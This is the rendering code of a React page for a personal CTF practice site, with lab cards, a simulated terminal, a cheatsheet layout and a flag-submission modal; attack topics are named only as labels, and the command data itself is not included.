    <div className="min-h-screen bg-[#0a0e17] text-slate-200 cyber-grid-pattern relative flex flex-col selection:bg-[#00ff66]/20 selection:text-[#00ff66]">
      {/* Top Header - Zone Contract: Brand | Navigation Links | Action / Live Status */}
      <header className="sticky top-0 z-40 bg-[#0a0e17]/90 backdrop-blur-md border-b border-slate-800/80 px-4 sm:px-6 lg:px-8 py-3.5 transition-all">
        <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
          
          {/* Zone 1: Single text element wordmark */}
          <a href="#" className="flex items-center gap-2 group">
            <div className="w-8 h-8 rounded bg-slate-900 border border-[#00ff66]/40 flex items-center justify-center text-[#00ff66] group-hover:border-[#00ff66] transition-colors shadow-[0_0_10px_rgba(0,255,102,0.2)]">
              <TerminalIcon className="w-4 h-4" />
            </div>
            <span className="text-lg sm:text-xl font-bold font-mono tracking-wider text-white">
              CTF <span className="text-[#00ff66]">/</span> LABS
            </span>
          </a>

          {/* Zone 2: Navigation Links */}
          <nav className="hidden md:flex items-center gap-6 text-xs sm:text-sm font-medium text-slate-400">
            <a href="#hubs" className="hover:text-white transition-colors">Category Hubs</a>
            <a href="#labs-grid" className="hover:text-white transition-colors">Lab Grid</a>
            <a href="#terminal-section" className="hover:text-[#00ff66] transition-colors font-mono">Terminal Simulator</a>
            <a href="#cheatsheet" className="hover:text-white transition-colors">Field Cheatsheet</a>
          </nav>

          {/* Zone 3: Live Status Badge & Terminal CTA */}
          <div className="flex items-center gap-3">
            <div className="hidden sm:flex items-center gap-2 px-3 py-1 rounded bg-[#00ff66]/10 border border-[#00ff66]/30 text-xs text-[#00ff66] font-mono">
              <span className="w-2 h-2 rounded-full bg-[#00ff66] animate-pulse"></span>
              <span>Labs Online - Interactive Mode Enabled</span>
            </div>
            <a
              href="#terminal-section"
              className="px-3 py-1.5 text-xs font-mono font-medium text-black bg-[#00ff66] hover:bg-[#00ff66]/90 rounded transition-colors whitespace-nowrap flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,255,102,0.3)]"
            >
              <TerminalIcon className="w-3.5 h-3.5" />
              <span>Shell Console</span>
            </a>
          </div>
        </div>
      </header>

      {/* Main Content Viewport */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-12">
        
        {/* HERO SECTION */}
        <section className="relative pt-4 pb-6 border-b border-slate-800/70">
          {/* Subtle Cyber Glow Backdrops */}
          <div className="absolute -top-10 left-1/4 w-96 h-64 bg-[#00ff66]/5 rounded-full blur-3xl pointer-events-none"></div>
          <div className="absolute top-0 right-1/4 w-80 h-56 bg-[#ff2a5f]/5 rounded-full blur-3xl pointer-events-none"></div>

          <div className="relative z-10 max-w-3xl space-y-4">
            {/* Live Status Badge */}
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded bg-slate-900/80 border border-[#00ff66]/30 text-xs font-mono text-[#00ff66]">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00ff66] opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#00ff66]"></span>
              </span>
              <span>Labs Online - Interactive Mode Enabled</span>
            </div>

            {/* Title & Curated by Abdurrahman */}
            <div className="space-y-1">
              <h1 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white font-mono">
                CTF <span className="text-[#00ff66]">/</span> LABS
              </h1>
              <p className="text-sm sm:text-base font-mono font-medium text-[#00ff66]">
                Curated by Abdurrahman
              </p>
            </div>

            {/* Tagline & Hero Description */}
            <p className="text-base sm:text-lg text-slate-300 font-medium">
              Hands-on practice environments focused on enumeration, web exploitation, and Linux fundamentals.
            </p>

            <p className="text-sm text-slate-400 leading-relaxed max-w-2xl">
              Interactive lab environments, enumeration techniques, web vulnerability analysis, and Linux privilege escalation mechanics.
            </p>

            {/* Quick Metrics Bar */}
            <div className="pt-4 flex flex-wrap items-center gap-6 text-xs font-mono text-slate-400 border-t border-slate-800/60">
              <div className="flex items-center gap-2">
                <span className="text-slate-500">Available Labs:</span>
                <span className="text-white font-bold tabular-nums">12 Modules</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-slate-500">Captured Flags:</span>
                <span className="text-[#00ff66] font-bold tabular-nums">{solvedLabs.length} / 12</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-slate-500">Environment:</span>
                <span className="text-slate-300">Active Sandbox & Virtual Terminals</span>
              </div>
            </div>
          </div>
        </section>

        {/* CORE CATEGORY HUBS SPOTLIGHT */}
        <section id="hubs" className="space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <Shield className="w-4 h-4 text-[#00ff66]" />
                Core Category Modules
              </h2>
              <p className="text-xs text-slate-400">Specialized practice environments designed for deep vulnerability assessment</p>
            </div>
            <span className="text-xs font-mono text-slate-500">3 Dedicated Hubs</span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {/* Enumeration Hub */}
            <div 
              onClick={() => setSelectedCategory('Enumeration')}
              className={`group p-5 rounded-lg border cursor-pointer transition-all ${
                selectedCategory === 'Enumeration' 
                  ? 'bg-slate-900 border-[#00ff66] shadow-[0_0_15px_rgba(0,255,102,0.15)]' 
                  : 'bg-[#0f1624] border-slate-800 hover:border-slate-700'
              }`}
            >
              <div className="flex items-center justify-between mb-3">
                <div className="p-2.5 rounded bg-slate-900 border border-emerald-500/30 text-[#00ff66]">
                  <Globe className="w-5 h-5" />
                </div>
                <span className="text-xs font-mono text-emerald-400">4 Scenarios</span>
              </div>
              <h3 className="text-base font-bold text-white font-mono mb-1.5 group-hover:text-[#00ff66] transition-colors">
                Enumeration Hub
              </h3>
              <p className="text-xs text-slate-400 leading-relaxed">
                Network discovery, Nmap workflows, directory busting, OSINT, and service banner grabbing.
              </p>
              <div className="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono text-slate-500">
                <span>Filter Category</span>
                <span className="text-[#00ff66] group-hover:translate-x-1 transition-transform">→</span>
              </div>
            </div>

            {/* Web Exploitation Hub */}
            <div 
              onClick={() => setSelectedCategory('Web Exploitation')}
              className={`group p-5 rounded-lg border cursor-pointer transition-all ${
                selectedCategory === 'Web Exploitation' 
                  ? 'bg-slate-900 border-[#ff2a5f] shadow-[0_0_15px_rgba(255,42,95,0.15)]' 
                  : 'bg-[#0f1624] border-slate-800 hover:border-slate-700'
              }`}
            >
              <div className="flex items-center justify-between mb-3">
                <div className="p-2.5 rounded bg-slate-900 border border-red-500/30 text-[#ff2a5f]">
                  <Zap className="w-5 h-5" />
                </div>
                <span className="text-xs font-mono text-[#ff2a5f]">4 Scenarios</span>
              </div>
              <h3 className="text-base font-bold text-white font-mono mb-1.5 group-hover:text-[#ff2a5f] transition-colors">
                Web Exploitation Hub
              </h3>
              <p className="text-xs text-slate-400 leading-relaxed">
                SQL Injection, XSS, Command Injection, Burp Suite request tampering, and auth bypass.
              </p>
              <div className="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono text-slate-500">
                <span>Filter Category</span>
                <span className="text-[#ff2a5f] group-hover:translate-x-1 transition-transform">→</span>
              </div>
            </div>

            {/* Linux Fundamentals Hub */}
            <div 
              onClick={() => setSelectedCategory('Linux Fundamentals')}
              className={`group p-5 rounded-lg border cursor-pointer transition-all ${
                selectedCategory === 'Linux Fundamentals' 
                  ? 'bg-slate-900 border-[#00f0ff] shadow-[0_0_15px_rgba(0,240,255,0.15)]' 
                  : 'bg-[#0f1624] border-slate-800 hover:border-slate-700'
              }`}
            >
              <div className="flex items-center justify-between mb-3">
                <div className="p-2.5 rounded bg-slate-900 border border-cyan-500/30 text-[#00f0ff]">
                  <Cpu className="w-5 h-5" />
                </div>
                <span className="text-xs font-mono text-[#00f0ff]">4 Scenarios</span>
              </div>
              <h3 className="text-base font-bold text-white font-mono mb-1.5 group-hover:text-[#00f0ff] transition-colors">
                Linux Fundamentals Hub
              </h3>
              <p className="text-xs text-slate-400 leading-relaxed">
                File permissions, privilege escalation paths, shell scripting, and system internals.
              </p>
              <div className="mt-4 pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono text-slate-500">
                <span>Filter Category</span>
                <span className="text-[#00f0ff] group-hover:translate-x-1 transition-transform">→</span>
              </div>
            </div>
          </div>
        </section>

        {/* INTERACTIVE SEARCH & FILTER BAR */}
        <section id="labs-grid" className="space-y-4 pt-2">
          <div className="bg-[#0f1624] p-4 rounded-lg border border-slate-800 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4">
            {/* Search Input Field */}
            <div className="relative flex-1">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
              <input
                type="text"
                value={searchQuery}
                onChange={e => setSearchQuery(e.target.value)}
                placeholder="Search labs by title, CVE, tag, or tool (e.g. Nmap, SQLi, SUID, Gobuster)..."
                className="w-full pl-10 pr-9 py-2 bg-slate-950 border border-slate-800 rounded text-xs sm:text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:border-[#00ff66] transition-colors font-mono"
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery('')}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            {/* Category Filter Buttons */}
            <div className="flex flex-wrap items-center gap-1.5">
              {(['All Labs', 'Enumeration', 'Web Exploitation', 'Linux Fundamentals'] as Category[]).map(cat => {
                const isActive = selectedCategory === cat;
                return (
                  <button
                    key={cat}
                    onClick={() => setSelectedCategory(cat)}
                    className={`px-3 py-1.5 rounded text-xs font-mono transition-all whitespace-nowrap cursor-pointer ${
                      isActive
                        ? 'bg-[#00ff66] text-black font-semibold shadow-[0_0_12px_rgba(0,255,102,0.3)]'
                        : 'bg-slate-900 text-slate-400 hover:text-slate-200 hover:bg-slate-800 border border-slate-800'
                    }`}
                  >
                    {cat}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Secondary Sub-Filter: Difficulty & Result Count */}
          <div className="flex items-center justify-between text-xs font-mono text-slate-400 px-1">
            <div className="flex items-center gap-3">
              <span className="text-slate-500">Difficulty:</span>
              {(['All', 'Easy', 'Medium', 'Hard'] as Difficulty[]).map(diff => (
                <button
                  key={diff}
                  onClick={() => setSelectedDifficulty(diff)}
                  className={`hover:text-white transition-colors cursor-pointer ${
                    selectedDifficulty === diff
                      ? 'text-[#00ff66] underline font-bold'
                      : 'text-slate-400'
                  }`}
                >
                  {diff}
                </button>
              ))}
            </div>

            <div className="tabular-nums">
              Showing <span className="text-white font-bold">{filteredLabs.length}</span> of {LABS_DATA.length} labs
            </div>
          </div>

          {/* LAB GRID */}
          {filteredLabs.length === 0 ? (
            <div className="p-12 text-center rounded-lg border border-dashed border-slate-800 bg-[#0f1624]">
              <AlertCircle className="w-8 h-8 text-amber-400 mx-auto mb-3" />
              <h3 className="text-sm font-bold font-mono text-white mb-1">No matching lab modules found</h3>
              <p className="text-xs text-slate-400 max-w-md mx-auto mb-4">
                No labs match the filter query "{searchQuery}". Try clearing search filters or selecting "All Labs".
              </p>
              <button
                onClick={() => {
                  setSearchQuery('');
                  setSelectedCategory('All Labs');
                  setSelectedDifficulty('All');
                }}
                className="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-xs font-mono text-slate-200 transition-colors"
              >
                Reset All Filters
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
              {filteredLabs.map(lab => {
                const isSolved = solvedLabs.includes(lab.id);
                
                // Difficulty badge color styling
                const diffColor =
                  lab.difficulty === 'Easy'
                    ? 'text-emerald-400 border-emerald-500/30 bg-emerald-950/20'
                    : lab.difficulty === 'Medium'
                    ? 'text-amber-400 border-amber-500/30 bg-amber-950/20'
                    : 'text-[#ff2a5f] border-red-500/30 bg-red-950/20';

                return (
                  <div
                    key={lab.id}
                    className={`bg-[#0f1624] rounded-lg border p-5 flex flex-col justify-between transition-all duration-200 hover:border-slate-700 relative overflow-hidden group ${
                      isSolved ? 'border-emerald-500/40' : 'border-slate-800'
                    }`}
                  >
                    {/* Top Metadata Row: Difficulty Level & Category Tag & Solved Badge */}
                    <div>
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <div className="flex items-center gap-2">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase border ${diffColor}`}>
                            {lab.difficulty}
                          </span>
                          <span className="text-[11px] font-mono text-slate-400">
                            {lab.tag}
                          </span>
                        </div>
                        {isSolved && (
                          <div className="flex items-center gap-1 text-[11px] font-mono text-[#00ff66]">
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>SOLVED</span>
                          </div>
                        )}
                      </div>

                      {/* Lab Title */}
                      <h3 className="text-base font-bold font-mono text-white mb-2 group-hover:text-[#00ff66] transition-colors leading-snug">
                        {lab.title}
                      </h3>

                      {/* Short Description */}
                      <p className="text-xs text-slate-400 leading-relaxed mb-4">
                        {lab.description}
                      </p>

                      {/* Tool Tags */}
                      <div className="flex flex-wrap gap-1.5 mb-4">
                        {lab.tools.map(tool => (
                          <span
                            key={tool}
                            className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-[10px] font-mono text-slate-400"
                          >
                            {tool}
                          </span>
                        ))}
                      </div>
                    </div>

                    {/* Bottom Action Area: Estimated Time + "Enter Lab" button */}
                    <div className="pt-3 border-t border-slate-800/80 flex items-center justify-between gap-2">
                      <div className="flex items-center gap-1.5 text-[11px] font-mono text-slate-500">
                        <Clock className="w-3 h-3" />
                        <span>{lab.estimatedTime}</span>
                      </div>

                      <button
                        onClick={() => openLabModal(lab)}
                        className={`px-3 py-1.5 rounded text-xs font-mono font-bold transition-all flex items-center gap-1.5 cursor-pointer ${
                          isSolved
                            ? 'bg-slate-800 hover:bg-slate-700 text-[#00ff66] border border-[#00ff66]/30'
                            : 'bg-[#00ff66] hover:bg-[#00ff66]/90 text-black shadow-[0_0_10px_rgba(0,255,102,0.25)]'
                        }`}
                      >
                        <Play className="w-3 h-3 fill-current" />
                        <span>Enter Lab</span>
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </section>

        {/* EMBEDDED CYBER TERMINAL SIMULATOR */}
        <section id="terminal-section" className="space-y-4 pt-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
            <div>
              <h2 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <TerminalIcon className={`w-4 h-4 ${getThemeColorClass()}`} />
                Cyber Terminal Simulator
              </h2>
              <p className="text-xs text-slate-400">
                Interactive command-line interface directly connected to virtual host <span className="font-mono text-slate-300">ctf-labs</span>
              </p>
            </div>

            <div className="flex items-center gap-2">
              {/* Theme color cycler */}
              <button
                onClick={() => {
                  if (terminalTheme === 'green') setTerminalTheme('red');
                  else if (terminalTheme === 'red') setTerminalTheme('cyan');
                  else setTerminalTheme('green');
                }}
                className="px-2.5 py-1 bg-slate-900 border border-slate-800 hover:border-slate-700 rounded text-xs font-mono text-slate-300 flex items-center gap-1.5 transition-colors"
                title="Toggle Neon Color Theme"
              >
                <div className={`w-2 h-2 rounded-full ${terminalTheme === 'green' ? 'bg-[#00ff66]' : terminalTheme === 'red' ? 'bg-[#ff2a5f]' : 'bg-[#00f0ff]'}`}></div>
                <span>Theme</span>
              </button>

              {/* Clear */}
              <button
                onClick={() => setTerminalHistory([])}
                className="px-2.5 py-1 bg-slate-900 border border-slate-800 hover:border-slate-700 rounded text-xs font-mono text-slate-300 flex items-center gap-1 transition-colors"
              >
                <RotateCcw className="w-3 h-3" />
                <span>Clear</span>
              </button>

              {/* Maximize */}
              <button
                onClick={() => setIsTerminalMaximized(!isTerminalMaximized)}
                className="px-2.5 py-1 bg-slate-900 border border-slate-800 hover:border-slate-700 rounded text-xs font-mono text-slate-300 flex items-center gap-1 transition-colors"
              >
                {isTerminalMaximized ? <Minimize2 className="w-3 h-3" /> : <Maximize2 className="w-3 h-3" />}
                <span>{isTerminalMaximized ? 'Restore' : 'Expand'}</span>
              </button>
            </div>
          </div>

          {/* Terminal Console Window */}
          <div
            onClick={() => terminalInputRef.current?.focus()}
            className={`rounded-lg border bg-[#050810] shadow-2xl overflow-hidden transition-all duration-300 flex flex-col ${getThemeBorderClass()} ${
              isTerminalMaximized ? 'min-h-[620px]' : 'min-h-[420px]'
            }`}
          >
            {/* Terminal Titlebar */}
            <div className="bg-[#0b101c] px-4 py-2.5 border-b border-slate-800/80 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-2.5 h-2.5 rounded-full bg-red-500/80"></div>
                <div className="w-2.5 h-2.5 rounded-full bg-amber-500/80"></div>
                <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></div>
                <span className="text-xs font-mono text-slate-400 ml-2">
                  abdurrahman@ctf-labs: ~ (bash / pts/1)
                </span>
              </div>

              <div className="flex items-center gap-3 text-[11px] font-mono text-slate-500">
                <span>Tab: Autocomplete</span>
                <span>↑↓: History</span>
              </div>
            </div>

            {/* Terminal Body Screen */}
            <div className="p-4 flex-1 overflow-y-auto space-y-3 scanlines">
              {terminalHistory.map(item => (
                <div key={item.id} className="space-y-1">
                  {/* Prompt & Executed Command */}
                  <div className="flex items-center gap-2 font-mono text-xs">
                    <span className={`${getThemeColorClass()} font-semibold select-none`}>
                      abdurrahman@ctf-labs:~$
                    </span>
                    <span className="text-slate-100 font-bold">{item.command}</span>
                  </div>
                  {/* Command Output */}
                  <div className="pl-2 border-l border-slate-800">{item.output}</div>
                </div>
              ))}

              {/* Active Prompt Input Row */}
              <form onSubmit={handleTerminalSubmit} className="flex items-center gap-2 font-mono text-xs pt-1">
                <span className={`${getThemeColorClass()} font-semibold select-none shrink-0`}>
                  abdurrahman@ctf-labs:~$
                </span>
                <input
                  ref={terminalInputRef}
                  type="text"
                  value={commandInput}
                  onChange={e => setCommandInput(e.target.value)}
                  onKeyDown={handleKeyDown}
                  autoFocus
                  placeholder="type 'help', 'whoami', 'skills', 'ls', or 'cat flag.txt'..."
                  className="w-full bg-transparent text-slate-100 placeholder:text-slate-600 focus:outline-none caret-[#00ff66]"
                />
              </form>

              <div ref={terminalBottomRef} />
            </div>

            {/* Quick Interactive Command Bar */}
            <div className="bg-[#0b101c] px-4 py-2 border-t border-slate-800/80 flex items-center gap-2 overflow-x-auto text-[11px] font-mono">
              <span className="text-slate-500 shrink-0">Quick Commands:</span>
              {['help', 'whoami', 'skills', 'ls', 'cat flag.txt', 'cat notes.txt', 'sudo -l', 'theme'].map(cmd => (
                <button
                  key={cmd}
                  onClick={() => {
                    setCommandInput(cmd);
                    terminalInputRef.current?.focus();
                  }}
                  className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 hover:border-slate-700 transition-colors shrink-0 cursor-pointer"
                >
                  {cmd}
                </button>
              ))}
            </div>
          </div>
        </section>

        {/* OFFENSIVE SECURITY FIELD CHEATSHEET */}
        <section id="cheatsheet" className="space-y-4 pt-2">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <BookOpen className="w-4 h-4 text-[#00ff66]" />
                Field Manual & Quick Commands
              </h2>
              <p className="text-xs text-slate-400">Essential syntax for reconnaissance, web payload testing, and privilege escalation</p>
            </div>
            <span className="text-xs font-mono text-slate-500">1-Click Copy</span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
            {CHEAT_SHEET_COMMANDS.map((item, index) => (
              <div
                key={index}
                className="p-3.5 rounded bg-[#0f1624] border border-slate-800 hover:border-slate-700 flex flex-col justify-between gap-2 group transition-colors"
              >
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono text-[#00ff66] uppercase">
                      {item.category}
                    </span>
                    <span className="text-[10px] font-mono text-slate-500">CLI</span>
                  </div>
                  <div className="text-xs font-bold font-mono text-slate-200 mb-1.5">
                    {item.title}
                  </div>
                  <div className="p-2 rounded bg-black/50 border border-slate-800 text-[11px] font-mono text-slate-300 break-all select-all">
                    {item.cmd}
                  </div>
                </div>

                <button
                  onClick={() => handleCopy(item.cmd)}
                  className="self-end mt-1 px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-[10px] font-mono text-slate-300 hover:text-white flex items-center gap-1 transition-colors cursor-pointer"
                >
                  {copiedText === item.cmd ? (
                    <>
                      <Check className="w-3 h-3 text-[#00ff66]" />
                      <span className="text-[#00ff66]">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3 h-3" />
                      <span>Copy</span>
                    </>
                  )}
                </button>
              </div>
            ))}
          </div>
        </section>

      </main>

      {/* INTERACTIVE LAB MODAL / SANDBOX */}
      {activeLabModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 sm:p-6 overflow-y-auto">
          <div className="bg-[#0d121f] border border-slate-700 w-full max-w-3xl rounded-xl shadow-2xl overflow-hidden flex flex-col my-auto max-h-[90vh]">
            
            {/* Modal Header */}
            <div className="bg-[#090d16] px-5 py-4 border-b border-slate-800 flex items-center justify-between">
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase bg-slate-800 text-[#00ff66] border border-[#00ff66]/30">
                    {activeLabModal.category}
                  </span>
                  <span className="text-xs font-mono text-slate-400">
                    Target: <span className="text-white font-semibold">{activeLabModal.target}</span>
                  </span>
                </div>
                <h3 className="text-lg font-bold font-mono text-white">
                  {activeLabModal.title}
                </h3>
              </div>

              <button
                onClick={() => setActiveLabModal(null)}
                className="p-1.5 rounded-lg bg-slate-900 text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Body */}
            <div className="p-5 overflow-y-auto space-y-6">
              
              {/* Mission Scenario & Attack Vector */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="p-3.5 rounded bg-[#090d16] border border-slate-800">
                  <div className="text-xs font-mono text-[#00ff66] font-bold mb-1 flex items-center gap-1.5">
                    <Shield className="w-3.5 h-3.5" />
                    Mission Objective
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    {activeLabModal.objective}
                  </p>
                </div>

                <div className="p-3.5 rounded bg-[#090d16] border border-slate-800">
                  <div className="text-xs font-mono text-[#ff2a5f] font-bold mb-1 flex items-center gap-1.5">
                    <Zap className="w-3.5 h-3.5" />
                    Attack Vector
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    {activeLabModal.attackVector}
                  </p>
                </div>
              </div>

              {/* Suggested Terminal Commands */}
              <div className="space-y-2">
                <div className="text-xs font-mono text-slate-300 font-bold flex items-center justify-between">
                  <span>Suggested Command Execution:</span>
                  <span className="text-slate-500 font-normal">Click to copy</span>
                </div>
                <div className="space-y-1.5">
                  {activeLabModal.suggestedCommands.map((cmd, idx) => (
                    <div
                      key={idx}
                      onClick={() => handleCopy(cmd)}
                      className="p-2.5 rounded bg-black/60 border border-slate-800 hover:border-slate-700 flex items-center justify-between text-xs font-mono text-[#00ff66] cursor-pointer transition-colors group"
                    >
                      <span className="truncate mr-2">$ {cmd}</span>
                      <span className="shrink-0 text-slate-500 group-hover:text-white">
                        {copiedText === cmd ? <Check className="w-3.5 h-3.5 text-[#00ff66]" /> : <Copy className="w-3.5 h-3.5" />}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Step-by-Step Progressive Hints */}
              <div className="space-y-2">
                <div className="text-xs font-mono text-slate-300 font-bold">
                  Tactical Guidance & Hints:
                </div>
                <div className="space-y-1.5">
                  {activeLabModal.hints.map((hint, idx) => {
                    const isRevealed = revealedHints.includes(idx);
                    return (
                      <div key={idx} className="rounded border border-slate-800 bg-[#090d16] overflow-hidden text-xs">
                        <button
                          onClick={() => toggleHint(idx)}
                          className="w-full px-3 py-2 flex items-center justify-between text-slate-400 hover:text-white text-left font-mono"
                        >
                          <span>Hint #{idx + 1}</span>
                          {isRevealed ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                        </button>
                        {isRevealed && (
                          <div className="px-3 py-2 border-t border-slate-800/80 bg-slate-950 text-slate-300 leading-relaxed font-mono">
                            {hint}
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Interactive Flag Submission Box */}
              <div className="p-4 rounded-lg bg-[#090d16] border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="text-xs font-mono text-white font-bold flex items-center gap-1.5">
                    <Award className="w-4 h-4 text-[#00ff66]" />
                    Flag Submission Verification
                  </div>
                  <button
                    onClick={() => setFlagInput(activeLabModal.flag)}
                    className="text-[11px] font-mono text-slate-500 hover:text-slate-300 underline"
                  >
                    Paste Sample Flag
                  </button>
                </div>

                <form onSubmit={handleFlagSubmit} className="flex flex-col sm:flex-row gap-2">
                  <input
                    type="text"
                    value={flagInput}
                    onChange={e => setFlagInput(e.target.value)}
                    placeholder="Enter captured flag format: CTF{...}"
                    className="flex-1 px-3 py-2 rounded bg-slate-950 border border-slate-800 text-xs font-mono text-white placeholder:text-slate-600 focus:outline-none focus:border-[#00ff66]"
                  />
                  <button
                    type="submit"
                    className="px-4 py-2 rounded bg-[#00ff66] hover:bg-[#00ff66]/90 text-black font-mono font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_10px_rgba(0,255,102,0.2)]"
                  >
                    <Send className="w-3.5 h-3.5" />
                    <span>Verify Flag</span>
                  </button>
                </form>

                {/* Flag Feedback Alert */}
                {flagFeedback.status === 'success' && (
                  <div className="p-2.5 rounded bg-emerald-950/40 border border-[#00ff66]/40 text-[#00ff66] text-xs font-mono flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>{flagFeedback.message}</span>
                  </div>
                )}

                {flagFeedback.status === 'error' && (
                  <div className="p-2.5 rounded bg-red-950/40 border border-[#ff2a5f]/40 text-[#ff2a5f] text-xs font-mono flex items-center gap-2">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{flagFeedback.message}</span>
                  </div>
                )}
              </div>

            </div>

            {/* Modal Footer */}
            <div className="bg-[#090d16] px-5 py-3 border-t border-slate-800 flex items-center justify-between text-xs font-mono">
              <div className="text-slate-500">
                Status: {solvedLabs.includes(activeLabModal.id) ? (
                  <span className="text-[#00ff66] font-bold">COMPROMISED / SOLVED</span>
                ) : (
                  <span className="text-amber-400 font-semibold">ACTIVE TARGET</span>
                )}
              </div>
              <button
                onClick={() => setActiveLabModal(null)}
                className="px-3 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors"
              >
                Close Sandbox
              </button>
            </div>

          </div>
        </div>
      )}

      {/* MINIMALIST FOOTER */}
      <footer className="mt-16 border-t border-slate-800/80 bg-[#080c14] py-6 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-xs font-mono text-slate-500">
          <div>
            © CTF / LABS — Developed & Maintained by Abdurrahman
          </div>
          <div className="flex items-center gap-4">
            <span className="text-slate-600">Built for Red Teamers & Security Analysts</span>
            <a href="#" className="hover:text-white transition-colors">Back to Top ↑</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
